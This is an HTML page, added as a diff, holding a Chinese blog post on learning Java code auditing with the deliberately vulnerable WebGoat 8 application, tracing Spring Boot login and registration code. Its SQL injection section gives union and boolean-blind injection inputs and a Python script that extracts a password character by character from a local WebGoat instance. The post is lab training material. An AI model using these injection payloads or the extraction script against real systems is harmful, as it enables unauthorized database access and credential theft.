@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="java审计入门"/>
+
+
+
+
+  <meta name="keywords" content="java," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2020/02/28/java审计入门/"/>
+
+
+<meta name="description" content="开始学java🏃‍♀️">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java审计入门">
+<meta property="og:url" content="https://glotozz.github.io/2020/02/28/java%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:description" content="开始学java🏃‍♀️">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/02/28/xtUypsE4VFJl1Me.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/28/G5I9b4twkRCfDlj.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/28/1dCqZYWozsciyAl.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/28/sUd7kCRpIQZTYGD.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/28/1LzqMlK3WkSNTBX.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/28/dhPNnAyO2Wqfziv.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/29/mfrict5lJKAGb3N.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/29/cNWOUaPJ24pvhin.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/29/qZbBMclXSHJvezE.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/29/vMBXitcdrzDuRGF.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/29/YnU29aHDcRCT6d7.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/29/OMTgHhaSyPi3BUx.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/29/8WOCRgpX9PQ6n3c.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/29/hxjp7vLbilQAruP.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/29/JQ9b4fXdFTcL3nK.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/02/29/RmGWiNOAjwfKTgl.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/29/hCyDa25FlPqUioG.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/29/RmGWiNOAjwfKTgl.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/29/hCyDa25FlPqUioG.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/29/GkPJds75AqZveWa.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/29/gwQ34koTXvfmiBW.png">
+<meta property="article:published_time" content="2020-02-28T00:48:22.000Z">
+<meta property="article:modified_time" content="2020-02-28T18:56:06.787Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/02/28/xtUypsE4VFJl1Me.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> java审计入门 - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          java审计入门
+        
+      </h1>
+
+      <time class="post-time">
+          Feb 28 2020
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <p>开始学java🏃‍♀️</p>
+<meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#准备工作">准备工作</a></li>
+<li><a href="#webgoat-8">WebGoat 8</a></li>
+<li><a href="#开始审计">开始审计</a></li>
+<li><a href="#sqlinjection">SqlInjection</a></li>
+<li><a href="#参考链接">参考链接：</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<p>一般面试都会问到java漏洞了解嘛，会分析🐴，但我一般都是利用现成工具或者exp。趁还没开学时间比较多，学习一下java代码审计。</p>
+<h4><span id="准备工作">准备工作</span></h4><p><strong>安装</strong></p>
+<p><strong>运行java程序</strong>：先编译<code>a.java</code>=&gt;<code>a.class</code>，因此<code>.class</code>结尾的字节码文件需要反编译，工具我一般用jadx</p>
+<p><strong>java平台</strong>：java se，java ee，java me，主要学习第二个web服务</p>
+<p><strong>常见的java服务器</strong>： Tomcat、Weblogic、JBoss、GlassFish ，主要学习Tomcat</p>
+<p><strong>Tomcat目录结构</strong></p>
+<p><img src="https://i.loli.net/2020/02/28/xtUypsE4VFJl1Me.png" alt="Snipaste_2020-02-28_09-16-33.png"></p>
+<p><strong>Tomcat部署源码</strong></p>
+<p>javapms为例</p>
+<blockquote>
+<p>以SpringMVC+Spring+Hibernate+Freemarker+Html5+jQuery为技术核心架构 </p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/02/28/G5I9b4twkRCfDlj.png" alt="Snipaste_2020-02-28_09-47-08.png"></p>
+<p><strong>IDEA</strong></p>
+<p>导入项目并添加tomcat配置</p>
+<p><img src="https://i.loli.net/2020/02/28/1dCqZYWozsciyAl.png" alt="Snipaste_2020-02-28_09-56-16.png"></p>
+<p><strong>IDEA调试功能</strong></p>
+<p>当前项目结构不太懂，不知道如何下放断点，放一放</p>
+<p><strong>Maven-项目管理和构建工具</strong></p>
+<blockquote>
+<p>Maven是一种自动构建项目的方式，可以帮助我们自动从本地和远程仓库拉取关联jar包。 </p>
+</blockquote>
+<p>部署WebGoat为例，导入项目</p>
+<p><img src="https://i.loli.net/2020/02/28/sUd7kCRpIQZTYGD.png" alt="Snipaste_2020-02-28_10-13-36.png"></p>
+<p>完成之后background就开始下载，但是速度</p>
+<p><strong>Fortify 代码审计工具</strong></p>
+<p>暂时先也不用</p>
+<hr>
+<h4><span id="webgoat-8">WebGoat 8</span></h4><blockquote>
+<p>WebGoat8是基于Spring boot框架开发,故意不安全的Web应用程序，旨在教授Web应用程序安全性课程。</p>
+</blockquote>
+<p>需要的环境：java 11、Maven &gt; 3.2.1、IDEA</p>
+<p>安装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;WebGoat&#x2F;WebGoat.git</span><br><span class="line">cd WebGoat</span><br><span class="line">mvn clean package -Dmaven.test.skip&#x3D;true</span><br><span class="line">mvn -pl webgoat-server spring-boot:run -Dmaven.test.skip&#x3D;true</span><br></pre></td></tr></table></figure>
+
+<p>因为我有个包下载失败了就跳过这个包</p>
+<p>最后是如下的界面</p>
+<p><img src="https://i.loli.net/2020/02/28/1LzqMlK3WkSNTBX.png" alt="Snipaste_2020-02-28_22-05-31.png"></p>
+<p> <strong>import WebGoat到IDEA 进行代码查看及调试</strong> </p>
+<p><img src="https://i.loli.net/2020/02/28/dhPNnAyO2Wqfziv.png" alt="Snipaste_2020-02-28_22-26-44.png"></p>
+<p>发现已经配置好了</p>
+<p><strong>组件安全</strong></p>
+<p>也暂时跳过</p>
+<blockquote>
+<p>Dependency-Check是OWASP（Open Web Application Security Project）的一个实用开源程序 。</p>
+<p><a href="https://owasp.org/www-project-dependency-check/" target="_blank" rel="noopener">项目地址</a>以及<a href="https://yq.aliyun.com/articles/698621" target="_blank" rel="noopener">参考教程</a></p>
+</blockquote>
+<h4><span id="开始审计">开始审计</span></h4><p>第一个页面是登录，登录是很容易存在漏洞的功能点之一。</p>
+<p>没学过Spring boot框架，既然路由是<code>/login</code>，全局搜索<code>login</code></p>
+<p>找到<code>org/owasp/webgoat/WebSecurityConfig.java</code></p>
+<p>大致能看懂，但是漏洞看不出来==，参考文章指出这里下面存在漏洞</p>
+<p><img src="https://i.loli.net/2020/02/29/mfrict5lJKAGb3N.png" alt="Snipaste_2020-02-28_23-04-27.png"></p>
+<blockquote>
+<p>查阅<code>AuthenticationManagerBuilder auth</code> ，允许轻松构建内存身份验证，LDAP身份验证，基于JDBC的身份验证，添加UserDetailsService以及添加AuthenticationProvider。 </p>
+</blockquote>
+<p>那么追踪<code>userDetailsService</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private final UserService userDetailsService;</span><br></pre></td></tr></table></figure>
+
+<p>追踪<code>UserService</code></p>
+<p><img src="https://i.loli.net/2020/02/29/cNWOUaPJ24pvhin.png" alt="Snipaste_2020-02-28_23-25-02.png"></p>
+<p>和文章一样，<code>userRepository.findByUsername(username)</code>猜测是数据库查询，</p>
+<p>追踪</p>
+<p><img src="https://i.loli.net/2020/02/29/qZbBMclXSHJvezE.png" alt="Snipaste_2020-02-28_23-32-03.png"></p>
+<p>是个接口，追踪</p>
+<p><img src="https://i.loli.net/2020/02/29/vMBXitcdrzDuRGF.png" alt="Snipaste_2020-02-28_23-33-07.png"></p>
+<p>还是个接口，实现了更多方法，继续追踪，最后到<code>Repository</code>接口我也没找到实现这个接口的代码</p>
+<p><img src="https://i.loli.net/2020/02/29/YnU29aHDcRCT6d7.png" alt="Snipaste_2020-02-28_23-36-00.png"></p>
+<p>这是个导入的包，看来已经高度集成，那么只需要知道其用法即可</p>
+<blockquote>
+<p>[<a href="http://blog.720ui.com/2017/springboot_02_data_jpa/" target="_blank" rel="noopener">Spring Boot 揭秘与实战（二）</a>]</p>
+</blockquote>
+<p><strong>实体对象</strong></p>
+<p>创建一个 Author 实体，真实的表名是 t_author，包含 id（自增主键）、 realName、 nickname 字段。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@Entity</span><br><span class="line">@Table(name &#x3D; &quot;t_author&quot;)</span><br><span class="line">public class Author&#123;</span><br><span class="line">    @Id</span><br><span class="line">    @GeneratedValue(strategy &#x3D; GenerationType.AUTO)</span><br><span class="line">    private Long id;</span><br><span class="line"> </span><br><span class="line">    @Column(name&#x3D;&quot;real_name&quot;)</span><br><span class="line">    private String realName;</span><br><span class="line"> </span><br><span class="line">    @Column(name&#x3D;&quot;nick_name&quot;)</span><br><span class="line">    private String nickName;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; SET和GET方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>DAO相关</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public interface AuthorRepository extends JpaRepository&lt;Author, Long&gt; &#123;</span><br><span class="line"> </span><br><span class="line">    List&lt;Author&gt; findAll();</span><br><span class="line"> </span><br><span class="line">    @Query(&quot;from Author where id &#x3D; :id&quot;)</span><br><span class="line">    Author findAuthor(@Param(&quot;id&quot;) Long id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个from的是对象名，感觉类似于预编译，能防止sql注入</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/China_hdy/article/details/101300380" target="_blank" rel="noopener">SpringBoot查询findBy规则</a></p>
+</blockquote>
+<p>所以上面的类似于<code>fileByUsername()</code>类似于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">... where username&#x3D;?1</span><br></pre></td></tr></table></figure>
+
+<p>既然不存在sql注入，继续回去看</p>
+<p><code>createUser()</code>后，在之前<code>public WebGoatUser loadUserByUsername(String username)</code>的<code>return webGoatUser</code>后打上断点，并执行下一步，跳转如下</p>
+<p><img src="https://i.loli.net/2020/02/29/OMTgHhaSyPi3BUx.png" alt="Snipaste_2020-02-29_00-52-24.png"></p>
+<p>在进行比较。</p>
+<p><strong>注册功能</strong></p>
+<p>全局搜索路由<code>/registration</code></p>
+<p><img src="https://i.loli.net/2020/02/29/8WOCRgpX9PQ6n3c.png" alt="Snipaste_2020-02-29_00-56-47.png"></p>
+<p>追踪<code>validate()</code></p>
+<p><img src="https://i.loli.net/2020/02/29/hxjp7vLbilQAruP.png" alt="Snipaste_2020-02-29_01-03-36.png"></p>
+<p>之后就是<code>addUser()</code>，跟踪下发现也是利用封装好的<code>save()</code>插入数据库</p>
+<p>说好的不安全呢？？原来是要登录进去才开始实验</p>
+<img src="https://i.loli.net/2020/02/29/JQ9b4fXdFTcL3nK.jpg" alt="IMG_3502_20200229-011202_.PNG" style="zoom:37%;">
+
+<h4><span id="sqlinjection">SqlInjection</span></h4><p>全局搜索sqlinjection就能找到源码</p>
+<p><img src="https://i.loli.net/2020/02/29/RmGWiNOAjwfKTgl.png" alt="Snipaste_2020-02-29_01-37-25.png"></p>
+<p>查询的数据中department=Marketing才有回显</p>
+<p><img src="https://i.loli.net/2020/02/29/hCyDa25FlPqUioG.png" alt="Snipaste_2020-02-29_01-38-43.png"></p>
+<p>尝试联合注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from employees where department&#x3D;&#39;Marketing&#39; union select 1,2,3,&#39;Marketing&#39;,5,database()</span><br></pre></td></tr></table></figure>
+
+<p><code>Something went wrong</code>，应该是不支持这种语法，追踪下数据库</p>
+<p><img src="https://i.loli.net/2020/02/29/RmGWiNOAjwfKTgl.png" alt="Snipaste_2020-02-29_01-37-25.png"></p>
+<p>不知道是啥类型，测试发现盲注也不行，和mysql不是一个语法的。。这关似乎只是熟悉sql语法</p>
+<p><strong>challenge-9</strong></p>
+<p><img src="https://i.loli.net/2020/02/29/hCyDa25FlPqUioG.png" alt="Snipaste_2020-02-29_01-38-43.png"></p>
+<p>sql语句已经给了，简单的拼接。。</p>
+<p><strong>查看挑战</strong><code>org/owasp/webgoat/sql_injection/advanced/SqlInjectionChallenge.java</code></p>
+<p><img src="https://i.loli.net/2020/02/29/GkPJds75AqZveWa.png" alt="Snipaste_2020-02-29_01-55-00.png"></p>
+<p>明显问题出在checkUserQuery，是个布尔盲注，如果是mysql就不写了，这里写个脚本试试</p>
+<blockquote>
+<p>这里用<code>--</code>可以注释</p>
+<p><code>substr()</code>可以截取字符串</p>
+</blockquote>
+<p>构造下面的发现回显不同</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tom&#39;and &#39;1&#39;&#x3D;&#39;0&#39; -- </span><br><span class="line">tom&#39;and &#39;1&#39;&#x3D;&#39;1&#39; --</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/02/29/gwQ34koTXvfmiBW.png" alt="Snipaste_2020-02-29_02-14-51.png"></p>
+<p>是put请求</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/q649381130/article/details/77980304" target="_blank" rel="noopener">HTTP协议中PUT和POST使用区别</a></p>
+</blockquote>
+<p>写个脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python2</span><br><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">cookies &#x3D; &#123;</span><br><span class="line">	&#39;JSESSIONID&#39; :&#39;XQ9kMiDyU_tr5apUdGewRRG4qIq7-5uQtiOObyRw&#39;</span><br><span class="line">&#125;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;localhost:8080&#x2F;WebGoat&#x2F;SqlInjectionAdvanced&#x2F;challenge&quot;</span><br><span class="line">headers &#x3D; &#123;</span><br><span class="line">    &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko&#x2F;20100101 Firefox&#x2F;70.0&#39;</span><br><span class="line">&#125;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">tmp &#x3D; 0</span><br><span class="line"></span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    if tmp &#x3D;&#x3D; 1:</span><br><span class="line">        break</span><br><span class="line">    tmp &#x3D; 1</span><br><span class="line">    for j in range(97, 127):</span><br><span class="line">        payload &#x3D; &quot;password&quot;</span><br><span class="line">        param &#x3D; &quot;tom&#39; and ascii(substr((&#123;&#125;),&#123;&#125;,1))&#x3D;&#123;&#125; and &#39;1&#39;&#x3D;&#39;1&quot;.format(payload, str(i), str(j))</span><br><span class="line">        print(param)</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">        	&#39;username_reg&#39;:param,</span><br><span class="line">        	&#39;email_reg&#39;:&#39;bb%40qq.com&#39;,</span><br><span class="line">        	&#39;password_reg&#39;:&#39;cc&#39;,</span><br><span class="line">        	&#39;confirm_password_reg&#39;:&#39;cc&#39;</span><br><span class="line">        &#125;</span><br><span class="line">        r &#x3D; requests.put(url&#x3D;url, headers&#x3D;headers, data&#x3D;data, cookies&#x3D;cookies)</span><br><span class="line">        # r &#x3D; requests.post(url&#x3D;url, headers&#x3D;headers, cookies&#x3D;cookies, data&#x3D;data)</span><br><span class="line">        c &#x3D; json.dumps(r.json())</span><br><span class="line">        # print(c)</span><br><span class="line">        if &quot;already&quot; in c:</span><br><span class="line">            tmp &#x3D; 0</span><br><span class="line">            flag &#x3D; flag + chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>最后，有空分析一下spring中的反序列化漏洞和FastJson反序列化漏洞，看了原理还是比较容易理解的。</p>
+<hr>
+<h4><span id="参考链接">参考链接：</span></h4><p> <a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42149&amp;fromuid=365932" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42149&amp;fromuid=365932</a> </p>
+<p> <a href="https://www.freebuf.com/vuls/214039.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/214039.html</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/java/" rel="tag"><i class="fa fa-tag"></i> java</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2020/02/27/XSS-bypass-CSP/">
+        <span class="next-text nav-default">XSS&bypass CSP</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
